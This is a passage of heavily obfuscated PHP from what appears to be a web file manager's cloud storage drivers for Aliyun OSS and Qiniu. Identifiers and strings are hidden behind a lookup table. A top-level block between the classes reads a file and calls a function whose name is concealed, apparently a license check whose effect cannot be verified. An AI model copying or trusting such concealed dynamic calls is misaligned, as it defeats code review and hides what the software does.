$¦Êµ™¡[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ªüÒú‘É); } else { if (!isset($¦Êµ™¡[OSS\OssClient::OSS_HEADERS])) { $¦Êµ™¡[OSS\OssClient::OSS_HEADERS] = array(); } $¦Êµ™¡[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ªüÒú‘É); } return $¦Êµ™¡; } public function link($¡èÎ·îÛ, $‡ŒÔóéõ = array()) { $îÏƒĞü =& $_SERVER[ÅÄÇĞô]; if (!$this->exist($¡èÎ·îÛ) || $this->isFolder($¡èÎ·îÛ)) { return !1; } try { $‡ŒÔóéõ = $this->trafficLimit($îÏƒĞü[112], $‡ŒÔóéõ, !0); $“«å¦íñ = $this->client->signUrl($this->bucket, $this->pathEncode($¡èÎ·îÛ), 3600 * 12, $îÏƒĞü[1519], $‡ŒÔóéõ); return $this->getCdnLink($“«å¦íñ); } catch (OSS\Core\OssException $ƒ¯²Ù¬å) { $this->writeLog(__FUNCTION__ . $îÏƒĞü[215] . $ƒ¯²Ù¬å->getMessage()); return !1; } } public function fileOut($ÍÉø¶Ïş, $˜›íÎäú = false, $üßª«³ï = false, $üÖßËîÆ = '') { $ì—„¾Ñ– =& $_SERVER[ÅÄÇĞô]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÍÉø¶Ïş, $˜›íÎäú, $üßª«³ï, $üÖßËîÆ); } if (!$üßª«³ï) { $üßª«³ï = $this->pathThis($ÍÉø¶Ïş); } $üßª«³ï = rawurlencode($üßª«³ï); $ˆ”Ü‚àÅ = get_file_mime(get_path_ext($üßª«³ï)); if ($ˆ”Ü‚àÅ == $ì—„¾Ñ–[251]) { return parent::fileOut($ÍÉø¶Ïş, $˜›íÎäú, $üßª«³ï, $üÖßËîÆ); } $˜›íÎäú = $˜›íÎäú ? $ì—„¾Ñ–[1520] : $ì—„¾Ñ–[1521]; $·±ëÓĞ³ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ì—„¾Ñ–[1522] . rawurlencode("{$˜›íÎäú}\73\x66\x69\154\145\x6e\141\x6d\x65\75{$üßª«³ï}")); $·±ëÓĞ³[OSS\OssClient::OSS_SUB_RESOURCE] .= $ì—„¾Ñ–[1523] . rawurlencode($ˆ”Ü‚àÅ); $ãÉˆü‡¿ = $this->link($ÍÉø¶Ïş, $·±ëÓĞ³); $this->fileOutLink($ãÉˆü‡¿); } public function fileOutServer($¡Ñä›ÆĞ, $±†À’€ = false, $ñ…ÉÖ™Š = false, $Õ•Ãø³¼ = '') { parent::fileOut($¡Ñä›ÆĞ, $±†À’€, $ñ…ÉÖ™Š, $Õ•Ãø³¼); } public function fileOutImage($•íî÷ù‘, $²·×ÍµÇ = 250) { if ($this->size($•íî÷ù‘) > 1024 * 1024 * 20) { return $this->fileOutImageServer($•íî÷ù‘, $²·×ÍµÇ); } $£•ôû“ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ÅÄÇĞô][1484] . $²·×ÍµÇ); $öê‚—ç = $this->link($•íî÷ù‘, $£•ôû“); $this->fileOutLink($öê‚—ç); } public function fileOutImageServer($æÇ¬û£Ò, $ë²ÙÙœ = 250) { parent::fileOutImage($æÇ¬û£Ò, $ë²ÙÙœ); } public function fileOutLink($§×‚ƒ ¢) { $Ø¡Æ¼€Ú =& $_SERVER[ÅÄÇĞô]; if (!$this->isCdnHost() && substr($§×‚ƒ ¢, 0, 7) == $Ø¡Æ¼€Ú[219]) { $§×‚ƒ ¢ = $Ø¡Æ¼€Ú[220] . substr($§×‚ƒ ¢, 7); } header($Ø¡Æ¼€Ú[175] . $§×‚ƒ ¢); die; } public function hashMd5($¡çÃæ¶ó, $—§¹¬… = '') { $ºÆÀ”È• =& $_SERVER[ÅÄÇĞô]; $‡ü±Œû• = $this->_objectMeta($¡çÃæ¶ó); if (!$‡ü±Œû•) { return $ºÆÀ”È•[12]; } if (!isset($‡ü±Œû•[$ºÆÀ”È•[1504]]) && !empty($—§¹¬…)) { $ıŠ¤Âë¦ = $this->updateObjMeta($¡çÃæ¶ó, array($ºÆÀ”È•[1504] => $—§¹¬…)); $‡ü±Œû•[$ºÆÀ”È•[1504]] = $ıŠ¤Âë¦ ? $—§¹¬… : $ºÆÀ”È•[12]; } return isset($‡ü±Œû•[$ºÆÀ”È•[1504]]) ? strtolower($‡ü±Œû•[$ºÆÀ”È•[1504]]) : $ºÆÀ”È•[12]; } public function size($®¤¹õ¢) { $‚ëÉÉ¹ = $this->objectMeta($®¤¹õ¢); return $‚ëÉÉ¹ ? $‚ëÉÉ¹[$_SERVER[ÅÄÇĞô][79]] : 0; } public function info($£ÛÏÖù) { if ($this->isFolder($£ÛÏÖù)) { return $this->folderInfo($£ÛÏÖù); } else { if ($this->isFile($£ÛÏÖù)) { return $this->fileInfo($£ÛÏÖù); } } return !1; } public function exist($Å±±ãÉ¿) { return $this->isFile($Å±±ãÉ¿) || $this->isFolder($Å±±ãÉ¿); } public function isFile($‚££Œé) { return !$this->isFolder($‚££Œé) && $this->objectMeta($‚££Œé); } public function isFolder($‹íø²Âê) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][180], $‹íø²Âê); } protected function objectMeta($öˆ•—ÙÆ) { return $this->cacheMethod($_SERVER[ÅÄÇĞô][182], $öˆ•—ÙÆ); } protected function _objectMeta($§µúĞ¨ş) { $˜°…®¼¾ =& $_SERVER[ÅÄÇĞô]; try { $³ÜŞÅ¡æ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($§µúĞ¨ş)); } catch (OSS\Core\OssException $¬ÀĞñ¼ä) { $this->writeLog(__FUNCTION__ . $˜°…®¼¾[215] . $¬ÀĞñ¼ä->getMessage()); $³ÜŞÅ¡æ = !1; } if ($³ÜŞÅ¡æ) { $³ÜŞÅ¡æ[$˜°…®¼¾[79]] = intval($³ÜŞÅ¡æ[$˜°…®¼¾[1502]]); } return $³ÜŞÅ¡æ; } protected function _isFolder($×Ù•Ñ¨ò) { $İŒˆ  =& $_SERVER[ÅÄÇĞô]; if ($×Ù•Ñ¨ò == $İŒˆ [12] || $×Ù•Ñ¨ò == $İŒˆ [8]) { return !0; } $ªÀ¯“ = array($İŒˆ [1497] => $İŒˆ [8], $İŒˆ [1498] => rtrim($×Ù•Ñ¨ò, $İŒˆ [8]) . $İŒˆ [8], $İŒˆ [1499] => 1, $İŒˆ [1500] => $İŒˆ [12]); $Š²™¾¤‹ = $this->client->listObjects($this->bucket, $ªÀ¯“); if ($Š²™¾¤‹->getObjectList() || $Š²™¾¤‹->getPrefixList()) { return !0; } return !1; } public function writeLog($•üÖ–Î = '', $¾îŠì¡Š = false) { $·ºÏ’„’ =& $_SERVER[ÅÄÇĞô]; $ª±â–ë‘ = in_array(ACTION, array($·ºÏ’„’[213], $·ºÏ’„’[214])); if (!$ª±â–ë‘ && !GLOBAL_DEBUG) { return; } $¾ıÑ Ú = 0; if (stripos($•üÖ–Î, $·ºÏ’„’[1524]) !== !1) { $¾ıÑ Ú = 1; $â§¥ØŸ = explode($·ºÏ’„’[1525], $•üÖ–Î); $•üÖ–Î = !empty($â§¥ØŸ[1]) ? $â§¥ØŸ[1] : $•üÖ–Î; } else { if (stripos($•üÖ–Î, $·ºÏ’„’[1526])) { $¾ıÑ Ú = 2; $â§¥ØŸ = explode($·ºÏ’„’[1526], $•üÖ–Î); $â§¥ØŸ = explode($·ºÏ’„’[4], $â§¥ØŸ[0]); $•üÖ–Î = !empty($â§¥ØŸ[1]) ? $â§¥ØŸ[1] : $•üÖ–Î; } } if ($ª±â–ë‘ && I18n::getType() == $·ºÏ’„’[1527]) { if ($¾ıÑ Ú == 1) { $•üÖ–Î = str_replace($·ºÏ’„’[1528], $·ºÏ’„’[1529], $•üÖ–Î); } else { if ($¾ıÑ Ú == 2) { $â§¥ØŸ = explode($·ºÏ’„’[215], $â§¥ØŸ[0]); $îÕ§øç¿ = isset($â§¥ØŸ[1]) ? $â§¥ØŸ[1] : $·ºÏ’„’[12]; $şƒñ×Ô× = array($·ºÏ’„’[1530] => $·ºÏ’„’[1531], $·ºÏ’„’[1532] => $·ºÏ’„’[1533], $·ºÏ’„’[1534] => $·ºÏ’„’[1535], $·ºÏ’„’[1536] => $·ºÏ’„’[1537], $·ºÏ’„’[1538] => $·ºÏ’„’[1539], $·ºÏ’„’[1540] => $·ºÏ’„’[1541], $·ºÏ’„’[1542] => $·ºÏ’„’[1543], $·ºÏ’„’[1544] => $·ºÏ’„’[1545], $·ºÏ’„’[1546] => $·ºÏ’„’[1547], $·ºÏ’„’[1548] => $·ºÏ’„’[1549]); if (isset($şƒñ×Ô×[$îÕ§øç¿])) { $•üÖ–Î = $şƒñ×Ô×[$îÕ§øç¿]; } } } if (stripos($•üÖ–Î, $·ºÏ’„’[1550])) { $•üÖ–Î = $·ºÏ’„’[1551]; } } if (!trim($•üÖ–Î)) { return; } parent::writeLog(trim($•üÖ–Î), $¾îŠì¡Š); } } if ($_SERVER[$_SERVER[ÅÄÇĞô][837]] != $_SERVER[$_SERVER[ÅÄÇĞô][1552]]) { $_getc = $_SERVER[ÅÄÇĞô][838]; $_getfile = $_SERVER[$_SERVER[ÅÄÇĞô][839]] . $_SERVER[ÅÄÇĞô][840]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÅÄÇĞô][288], $_getfilec); if (count($_getarrs) < $_SERVER[ÅÄÇĞô][688]) { $exit = $_SERVER[ÅÄÇĞô][841]; $exit(); } $_act = $_SERVER[ÅÄÇĞô][842]; $_act($_SERVER[$_SERVER[ÅÄÇĞô][835]]); } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ÒÂÕñÔâ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ÅÄÇĞô][1553]; $this->_init($ÒÂÕñÔâ); } public function _init($…÷¶Ğ“) { $¤¦õ¸ş· =& $_SERVER[ÅÄÇĞô]; $this->config = $…÷¶Ğ“; foreach ($…÷¶Ğ“ as $ò÷Êéœ® => $˜ı…»Ó») { if (isset($this->{$ò÷Êéœ®})) { $this->{$ò÷Êéœ®} = $˜ı…»Ó»; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¤¦õ¸ş·[1554] . LNG($¤¦õ¸ş·[1488])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ìŸÚÃõå, $°Äõöëƒ = '', $Üïãò˜¶ = REPEAT_RENAME) { if ($this->setContent($ìŸÚÃõå, $°Äõöëƒ)) { return $this->getPathOuter($ìŸÚÃõå); } return !1; } public function mkdir($ÏŒÖĞî, $ê—ë¶Á = REPEAT_SKIP) { $»­ŠÊ¥ =& $_SERVER[ÅÄÇĞô]; $ÉİÖ›Ëº = trim($ÏŒÖĞî, $»­ŠÊ¥[8]); if ($this->_isFolder($ÉİÖ›Ëº)) { return $this->getPathOuter($ÉİÖ›Ëº); } $ÏŒÖĞî = $ÉİÖ›Ëº . $»­ŠÊ¥[8]; $¦ş—îÙš = get_path_this($ÉİÖ›Ëº); $€ºƒ­çç = $ÏŒÖĞî . $¦ş—îÙš; if (!$this->mkfile($€ºƒ­çç)) { return !1; } if (!$this->moveFile($€ºƒ­çç, $ÏŒÖĞî)) { $this->delFile($€ºƒ­çç); return !1; } return $this->getPathOuter($ÉİÖ›Ëº); } public function copyFile($â Ç÷, $üµ»¨„ ) { $ÀøÌÆ¾• = $this->bucketManager->copy($this->bucket, $â Ç÷, $this->bucket, $üµ»¨„ , !0); return $ÀøÌÆ¾• ? !1 : $this->getPathOuter($üµ»¨„ ); } public function moveFile($”•ø±‚½, $ÁàÁˆ§©) { $öî«äá = $this->bucketManager->move($this->bucket, $”•ø±‚½, $this->bucket, $ÁàÁˆ§©, !0); return $öî«äá ? !1 : $this->getPathOuter($ÁàÁˆ§©); } public function delFile($©ÁÁá¿Ì) { if (!$this->exist($©ÁÁá¿Ì)) { return !0; } $ûø¨Àé = $this->bucketManager->delete($this->bucket, $©ÁÁá¿Ì); if (!$ûø¨Àé) { return !0; } return $ûø¨Àé->code() == 612 ? !0 : !1; } public function delFolder($ƒé¹„ó) { $ß¥ù›ñ =& $_SERVER[ÅÄÇĞô]; if (!$this->exist($ƒé¹„ó)) { return !0; } $this->listItemCache = !1; $ï—×•’¨ = $this->fileList($ƒé¹„ó); $this->listItemCache = !0; $ë§“Â• = trim($ƒé¹„ó, $ß¥ù›ñ[8]) . $ß¥ù›ñ[8]; if (!empty($ƒé¹„ó) && $ƒé¹„ó !== $ß¥ù›ñ[231] && !in_array($ë§“Â•, $ï—×•’¨[$ß¥ù›ñ[85]])) { $ï—×•’¨[$ß¥ù›ñ[85]][] = $ë§“Â•; } $è«ÜÛıÔ = $this->delByBatch($ï—×•’¨[$ß¥ù›ñ[86]]); if (!$è«ÜÛıÔ) { return !1; } $è«ÜÛıÔ = $this->delByBatch($ï—×•’¨[$ß¥ù›ñ[85]]); if (!$è«ÜÛıÔ) { return !1; } return $this->delFile($ë§“Â•); } private function delByBatch($¸ÎèÛ•¾) { foreach (array_chunk($¸ÎèÛ•¾, 1000) as $ ‚˜ü‰ˆ) { $¨»ŸÅ’ = $this->bucketManager->buildBatchDelete($this->bucket, $ ‚˜ü‰ˆ); list($ù”Õå—, $È¨÷·ª¢) = $this->bucketManager->batch($¨»ŸÅ’); if ($È¨÷·ª¢) { return !1; } } return !0; } public function rename($½‚’óì©, $Ì«Ë˜Ÿû) { return $this->renameObject($½‚’óì©, $Ì«Ë˜Ÿû); } public function fileInfo($˜ÙÓÁìÏ, $ìÖüˆÑœ = false, $Ù¾…êû = array()) { $¯¢ñ‰œ™ =& $_SERVER[ÅÄÇĞô]; $§¦¨Ô¹ = array($¯¢ñ‰œ™[32] => $this->pathThis($˜ÙÓÁìÏ), $¯¢ñ‰œ™[87] => $this->getPathOuter($¯¢ñ‰œ™[8] . $˜ÙÓÁìÏ), $¯¢ñ‰œ™[33] => $¯¢ñ‰œ™[233], $¯¢ñ‰œ™[79] => isset($Ù¾…êû[$¯¢ñ‰œ™[1555]]) ? $Ù¾…êû[$¯¢ñ‰œ™[1555]] : 0, $¯¢ñ‰œ™[169] => $this->ext($˜ÙÓÁìÏ)); if ($ìÖüˆÑœ) { return $§¦¨Ô¹; } $§¦¨Ô¹[$¯¢ñ‰œ™[234]] = $§¦¨Ô¹[$¯¢ñ‰œ™[88]] = 0; $§¦¨Ô¹[$¯¢ñ‰œ™[235]] = $§¦¨Ô¹[$¯¢ñ‰œ™[236]] = !0; if (empty($Ù¾…êû)) { $Ù¾…êû = $this->objectMeta($˜ÙÓÁìÏ); if (!$Ù¾…êû) { return $§¦¨Ô¹; } } if (isset($Ù¾…êû[$¯¢ñ‰œ™[237]]) && $Ù¾…êû[$¯¢ñ‰œ™[237]]) { $§¦¨Ô¹[$¯¢ñ‰œ™[238]] = $Ù¾…êû[$¯¢ñ‰œ™[237]]; } if (isset($Ù¾…êû[$¯¢ñ‰œ™[248]]) && $Ù¾…êû[$¯¢ñ‰œ™[248]]) { $§¦¨Ô¹[$¯¢ñ‰œ™[238]] = $Ù¾…êû[$¯¢ñ‰œ™[248]]; } if (isset($Ù¾…êû[$¯¢ñ‰œ™[1556]])) { $§¦¨Ô¹[$¯¢ñ‰œ™[88]] = substr($Ù¾…êû[$¯¢ñ‰œ™[1556]] . $¯¢ñ‰œ™[12], 0, 10); } if (isset($Ù¾…êû[$¯¢ñ‰œ™[1555]])) { $§¦¨Ô¹[$¯¢ñ‰œ™[79]] = $Ù¾…êû[$¯¢ñ‰œ™[1555]]; } return $§¦¨Ô¹; } public function folderInfo($Á¿ˆÉ¢Ì, $±ôƒÑˆ† = false) { $£ıµ¹ö =& $_SERVER[ÅÄÇĞô]; $ƒÍ§Ó†“ = array($£ıµ¹ö[32] => $this->pathThis($Á¿ˆÉ¢Ì), $£ıµ¹ö[87] => $this->getPathOuter($£ıµ¹ö[8] . $Á¿ˆÉ¢Ì), $£ıµ¹ö[33] => $£ıµ¹ö[78]); if ($±ôƒÑˆ†) { return $ƒÍ§Ó†“; } $ƒÍ§Ó†“[$£ıµ¹ö[234]] = $ƒÍ§Ó†“[$£ıµ¹ö[88]] = 0; $ƒÍ§Ó†“[$£ıµ¹ö[235]] = $ƒÍ§Ó†“[$£ıµ¹ö[236]] = !0; $Á¿ˆÉ¢Ì = rtrim($Á¿ˆÉ¢Ì, $£ıµ¹ö[8]) . $£ıµ¹ö[8]; $ôşñ˜ = $this->objectMeta($Á¿ˆÉ¢Ì); if (isset($ôşñ˜[$£ıµ¹ö[1556]])) { $ƒÍ§Ó†“[$£ıµ¹ö[88]] = substr($ôşñ˜[$£ıµ¹ö[1556]] . $£ıµ¹ö[12], 0, 10); } return $ƒÍ§Ó†“; } public function listPath($Ø¬Ì·Ùô, $±í»àùŠ = false) { $üµÛÙµù =& $_SERVER[ÅÄÇĞô]; $û´“ÕÌ„ = $this->fileList($Ø¬Ì·Ùô, $üµÛÙµù[8], !0); foreach ($û´“ÕÌ„[$üµÛÙµù[85]] as $ÎãÉ§â‰ => $¦´€Ïõ) { $û´“ÕÌ„[$üµÛÙµù[85]][$ÎãÉ§â‰] = $this->folderInfo($¦´€Ïõ, $±í»àùŠ); } foreach ($û´“ÕÌ„[$üµÛÙµù[86]] as $ÎãÉ§â‰ => $¦´€Ïõ) { $û´“ÕÌ„[$üµÛÙµù[86]][$ÎãÉ§â‰] = $this->fileInfo($¦´€Ïõ[$üµÛÙµù[97]], $±í»àùŠ, $¦´€Ïõ); } return $û´“ÕÌ„; } public function has($©ùŠ²Ö, $¸ïÍ¶éë = false, $Å·¯ĞÛ“ = true) { $ª„ù—ş­ =& $_SERVER[ÅÄÇĞô]; $©ùŠ²Ö = trim($©ùŠ²Ö, $ª„ù—ş­[8]); $†ö„œÁø = empty($©ùŠ²Ö) && $©ùŠ²Ö !== $ª„ù—ş­[231] ? $ª„ù—ş­[12] : $©ùŠ²Ö . $ª„ù—ş­[8]; $ÙÈ‚ùüí = $ª„ù—ş­[12]; $ºŸƒ»ú = 500; $Ñ§à ö¿ = $ª„ù—ş­[8]; $êÛÅ›£¦ = $®ìÌßßõ = 0; while (!0) { check_abort(); list($×¤ß×øü, $…ˆÛ§òØ) = $this->bucketManager->listFiles($this->bucket, $†ö„œÁø, $ÙÈ‚ùüí, $ºŸƒ»ú, $Ñ§à ö¿); if ($…ˆÛ§òØ) { break; } $ÙÈ‚ùüí = array_key_exists($ª„ù—ş­[1500], $×¤ß×øü) ? $ÙÈ‚ùüí = $×¤ß×øü[$ª„ù—ş­[1557]] : $ª„ù—ş­[12]; if ($¸ïÍ¶éë) { if (!empty($×¤ß×øü[$ª„ù—ş­[1558]])) { $êÛÅ›£¦ += count($×¤ß×øü[$ª„ù—ş­[1558]]); } if (!empty($×¤ß×øü[$ª„ù—ş­[1559]])) { $®ìÌßßõ += count($×¤ß×øü[$ª„ù—ş­[1559]]); } if ($ÙÈ‚ùüí === $ª„ù—ş­[12]) { break; } continue; } if ($Å·¯ĞÛ“) { if (!empty($×¤ß×øü[$ª„ù—ş­[1558]])) { return !0; } } else { if (!empty($×¤ß×øü[$ª„ù—ş­[1559]])) { return !0; } } if ($ÙÈ‚ùüí === $ª„ù—ş­[12]) { break; } } if ($¸ïÍ¶éë) { return array($ª„ù—ş­[242] => $êÛÅ›£¦, $ª„ù—ş­[243] => $®ìÌßßõ); } return !1; } public function listAll($£ïØ‡¹) { $ÆÒË«ì“ =& $_SERVER[ÅÄÇĞô]; $Óôå‡ô = $this->fileList($£ïØ‡¹, $ÆÒË«ì“[12], !0); $ÒğÙ¹Å = array_to_keyvalue($Óôå‡ô[$ÆÒË«ì“[86]], $ÆÒË«ì“[32]); foreach ($Óôå‡ô[$ÆÒË«ì“[85]] as $¾ÜÏ¾ãï) { if (is_string($¾ÜÏ¾ãï)) { $ÒğÙ¹Å[$¾ÜÏ¾ãï] = array($ÆÒË«ì“[79] => 0); } } return $this->listAllFiles($£ïØ‡¹, $ÒğÙ¹Å); } private function fileList($ÃàÈşø¶, $Àüº‹­ø = '', $÷»ÅêüÚ = 0) { $„™âİ =& $_SERVER[ÅÄÇĞô]; $ÃàÈşø¶ = trim($ÃàÈşø¶, $„™âİ[8]); $÷ÒáÂ‘ = empty($ÃàÈşø¶) && $ÃàÈşø¶ !== $„™âİ[231] ? $„™âİ[12] : $ÃàÈşø¶ . $„™âİ[8]; $ù„ßò¢ = $„™âİ[12]; $€ª…™ÚÏ = 1000; $â€ŒœŸÄ = $İÔ¾ıôº = array(); while (!0) { check_abort(); list($Ï‹–êë©, $äùæ™Üâ) = $this->bucketManager->listFiles($this->bucket, $÷ÒáÂ‘, $ù„ßò¢, $€ª…™ÚÏ, $Àüº‹­ø); if ($äùæ™Üâ) { break; } $ù„ßò¢ = array_key_exists($„™âİ[1500], $Ï‹–êë©) ? $ù„ßò¢ = $Ï‹–êë©[$„™âİ[1557]] : $„™âİ[12]; $ÚğÕ×ıê = isset($Ï‹–êë©[$„™âİ[1558]]) ? $Ï‹–êë©[$„™âİ[1558]] : array(); $´µ¬“ç  = isset($Ï‹–êë©[$„™âİ[1559]]) ? $Ï‹–êë©[$„™âİ[1559]] : array(); foreach ($ÚğÕ×ıê as $İéÁıÁ) { if ($İéÁıÁ[$„™âİ[97]] == $÷ÒáÂ‘) { continue; } $ùÎ¦İÆ´ = $İéÁıÁ[$„™âİ[97]]; $áÙÇ°Ûí = $İéÁıÁ[$„™âİ[1555]]; $İéÁıÁ[$„™âİ[79]] = $áÙÇ°Ûí; $•»³œËò = $áÙÇ°Ûí == 0 && substr($ùÎ¦İÆ´, strlen($ùÎ¦İÆ´) - 1, 1) == $„™âİ[8] ? !0 : !1; $this->cacheMethodInfoSet($ùÎ¦İÆ´, $•»³œËò, $İéÁıÁ); if ($•»³œËò) { $â€ŒœŸÄ[] = $ùÎ¦İÆ´; continue; } $İÔ¾ıôº[] = $÷»ÅêüÚ ? $İéÁıÁ : $ùÎ¦İÆ´; } foreach ($´µ¬“ç  as $ùÎ¦İÆ´) { if ($ùÎ¦İÆ´ == $÷ÒáÂ‘) { continue; } $â€ŒœŸÄ[] = $ùÎ¦İÆ´; $this->cacheMethodInfoSet($ùÎ¦İÆ´, !0); } if ($ù„ßò¢ === $„™âİ[12]) { break; } } $this->cacheMethodInfoSet($ÃàÈşø¶, !0); return array($„™âİ[85] => $â€ŒœŸÄ, $„™âİ[86] => $İÔ¾ıôº); } public function canRead($«¹ÅäÛ) { return $this->exist($«¹ÅäÛ) ? !0 : !1; } public function canWrite($’¸Ä– Ä) { return $this->exist($’¸Ä– Ä) ? !0 : !1; } public function getContent($ÂšÚÆ) { return $this->fileSubstr($ÂšÚÆ, 0, -1); } public function setContent($ØÆä®Ú, $÷§„Çê® = '') { $ÜîóË˜÷ = $this->tempFile($this->pathThis($ØÆä®Ú)); file_put_contents($ÜîóË˜÷, $÷§„Çê®); if ($this->upload($ØÆä®Ú, $ÜîóË˜÷)) { $this->tempFileRemve($ÜîóË˜÷); return !0; } return !1; } public function refreshUrls($ÆÊÂ–Ï) { $è•Õ‹² =& $_SERVER[ÅÄÇĞô]; $°•ËÉÙ = array(); if (is_array($ÆÊÂ–Ï)) { foreach ($ÆÊÂ–Ï as $ÚÒ¥Öö£) { $°•ËÉÙ[] = $this->link($ÚÒ¥Öö£); } } else { $°•ËÉÙ[] = $this->link($ÆÊÂ–Ï); } $õœÇ®Š = new Qiniu\Cdn\CdnManager($this->auth); list($ü•—ªõâ, $“»í¢Ôõ) = $õœÇ®Š->refreshUrls($°•ËÉÙ); if ($“»í¢Ôõ) { return !1; } return $ü•—ªõâ[$è•Õ‹²[1287]] == $è•Õ‹²[854] ? !0 : !1; } public function fileSubstr($¶ìƒº­£, $ïºÖ—, $Ëä¾ë€) { $¨½şÍ´í =& $_SERVER[ÅÄÇĞô]; if (!($û¶ïÓ® = $this->link($¶ìƒº­£))) { return !1; } $Ï‡ÓÏÙ = !1; if ($Ëä¾ë€ > 0) { $ºı·ùé = $ïºÖ— + $Ëä¾ë€ - 1; $Ï‡ÓÏÙ = array($¨½şÍ´í[1560] . $ïºÖ— . $¨½şÍ´í[465] . $ºı·ùé); } $±õƒ‘°´ = url_request($û¶ïÓ®, $¨½şÍ´í[1519], !1, $Ï‡ÓÏÙ); return $±õƒ‘°´[$¨½şÍ´í[845]] ? $±õƒ‘°´[$¨½şÍ´í[1310]] : !1; } public function upload($ÆñÆœœã, $õ©´Å‰û, $äİ‹µÁĞ = false, $¢ùé÷øÖ = REPEAT_REPLACE) { $»¬ùéæ = new Qiniu\Storage\UploadManager(); $Š¶Å—˜ = $this->auth->uploadToken($this->bucket, $ÆñÆœœã); $Ğİ’Ã‰ = get_file_mime(get_path_ext($õ©´Å‰û)); list($¾ƒĞŞÚÎ, $¯‰°šŸ¾) = $»¬ùéæ->putFile($Š¶Å—˜, $ÆñÆœœã, $õ©´Å‰û, null, $Ğİ’Ã‰); return $¯‰°šŸ¾ ? !1 : $this->getPathOuter($ÆñÆœœã); } public function uploadFormData($‘”ˆšöß, $»´é¯¯Ï = 3600) { return $this->uploadToken($‘”ˆšöß, $»´é¯¯Ï); } public function uploadMultiData($Ó·Š€Ëê, $®î¿ó¥’ = 3600) { return $this->uploadToken($Ó·Š€Ëê, $®î¿ó¥’); } private function uploadToken($ö¡áÈæ¾, $ Íş×¥´ = 3600) { $—¤¿äÙú =& $_SERVER[ÅÄÇĞô]; $‘ü’Ğ¦Ğ = $ Íş×¥´; $óºÉ…çø = array($—¤¿äÙú[1561] => $—¤¿äÙú[1562]); $Ãö·«® = $ö¡áÈæ¾; $³©á“ = $this->auth->uploadToken($this->bucket, $Ãö·«®, $‘ü’Ğ¦Ğ, $óºÉ…çø, !0); $íéì»ÛŒ = empty($this->region) || $this->region == $—¤¿äÙú[1563] ? $—¤¿äÙú[12] : $—¤¿äÙú[465] . $this->region; $ÕêíÒŞ = http_type() . "\72\57\x2f\x75\160\154\x6f\141\144{$íéì»ÛŒ}\56\161\151\156\151\x75\x70\x2e\143\157\155\57"; return array($—¤¿äÙú[1564] => $³©á“, $—¤¿äÙú[1565] => $ÕêíÒŞ); } public function download($¦ßÒí´¤, $ŸîÇ×üø) { $í’¬»ë = IO::getPathInner(IO::mkfile($ŸîÇ×üø)); if (!($™æÀìœû = $this->link($¦ßÒí´¤))) { return !1; } $§‡Üœä³ = 0; $ÊÂŞûÂ = 1024 * 200; $û¡–å½Í = fopen($í’¬»ë, $_SERVER[ÅÄÇĞô][1566]); while (!0) { $ò‰€º¤è = $this->fileSubstr($¦ßÒí´¤, $§‡Üœä³, $ÊÂŞûÂ); if ($ò‰€º¤è === !1) { return !1; } fwrite($û¡–å½Í, $ò‰€º¤è); $§‡Üœä³ += $ÊÂŞûÂ; if (strlen($ò‰€º¤è) < $ÊÂŞûÂ) { break; } } fclose($û¡–å½Í); return $ŸîÇ×üø; } public function link($‹»«•ŒØ, $¶¶×ü¶Ì = '') { if (!$this->isFile($‹»«•ŒØ)) { return !1; } $ùÙùÂÕ = $this->getHost() . $_SERVER[ÅÄÇĞô][8] . $this->pathEncode($‹»«•ŒØ) . $¶¶×ü¶Ì; return $this->auth->privateDownloadUrl($ùÙùÂÕ, 3600 * 12); } public function fileOut($ÇÚü›, $“‡’¡û¶ = false, $‡èÇ‡¼² = false, $—±ï¸¬ñ = '') { $Õåå¶Ş =& $_SERVER[ÅÄÇĞô]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÇÚü›, $“‡’¡û¶, $‡èÇ‡¼², $—±ï¸¬ñ); } if (!$‡èÇ‡¼²) { $‡èÇ‡¼² = $this->pathThis($ÇÚü›); } $ÉÜÜÎøÛ = $“‡’¡û¶ ? $Õåå¶Ş[1567] . rawurlencode($‡èÇ‡¼²) : $Õåå¶Ş[12]; $è™›—‹Õ = $this->link($ÇÚü›, $ÉÜÜÎøÛ); $this->fileOutLink($è™›—‹Õ); } public function fileOutServer($¬­œâç¬, $şıÄÍ = false, $õÁ€Ùø = false, $’úÔáÍö = '') { parent::fileOut($¬­œâç¬, $şıÄÍ, $õÁ€Ùø, $’úÔáÍö); } public function fileOutImage($¢±¬óÛ†, $µâÛ‘ƒü = 250) { if ($this->size($¢±¬óÛ†) > 1024 * 1024 * 20) { return $this->fileOutImageServer($¢±¬óÛ†, $µâÛ‘ƒü); } $ÒŒ¿Şôİ = $this->link($¢±¬óÛ†, $_SERVER[ÅÄÇĞô][1568] . $µâÛ‘ƒü); $this->fileOutLink($ÒŒ¿Şôİ); } public function fileOutImageServer($Éçãì¶Ë, $–…½Ìôû = 250) { parent::fileOutImage($Éçãì¶Ë, $–…½Ìôû); } public function hashMd5($õÂæìõ) { $ùí‰Üñø =& $_SERVER[ÅÄÇĞô]; $»«´å‹Ì = $this->objectMeta($õÂæìõ); return isset($»«´å‹Ì[$ùí‰Üñø[248]]) ? $»«´å‹Ì[$ùí‰Üñø[248]] : !1; $—¦ÌµëØ = $this->link($õÂæìõ, $ùí‰Üñø[1569]); } public function size($ßİğ¨å¹) { $Äü²ÀÔÇ = $this->objectMeta($ßİğ¨å¹); return $Äü²ÀÔÇ ? $Äü²ÀÔÇ[$_SERVER[ÅÄÇĞô][79]] : 0; } public function 